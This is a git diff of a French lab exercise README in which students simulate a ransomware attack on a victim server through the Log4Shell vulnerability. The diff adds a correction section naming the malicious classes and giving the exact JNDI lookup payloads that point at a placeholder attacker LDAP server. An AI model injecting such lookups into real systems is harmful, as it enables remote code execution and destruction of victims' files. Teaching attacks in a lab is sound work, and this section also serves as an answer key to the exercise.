@@ -5,7 +5,7 @@
 ## **Objectif** : Hasher les fichiers d'un serveur victime pour simuler une attaque ransomware avec la faille Log4Shell
 
 ### **Configuration** :
- Pour commencer, clonez le projet suivant (ou téléchargez l'archive): [tp_log4shell](??).  
+ Pour commencer, clonez le projet (ou téléchargez l'archive).  
 
  Dans ce projet, vous trouverez : 
 - Le serveur LDAP du pirate;
@@ -55,3 +55,7 @@ Pour vous aidez:
 - N'oubliez pas de modifier votre lookup en fonction de votre nouvelle classe ;p
 
 Pour vérifier que cette attaque a bien marché, vous devriez voir que tous les fichiers du web service de la victime ont été hashés. Si c'est le cas, bravo vous êtes un pirate !! 
+
+# POUR LA CORRECTION : 
+les classes malicieuses sont EnvVariable.java pour l'exercice 0, et Encryptor.java pour l'exercice 1.
+Les loopkups sont du coup : ${jndi:ldap://ip_server_1:9999/EnvVariable} pour l'exo 0 et ${jndi:ldap://ip_server_1:9999/Encryptor}
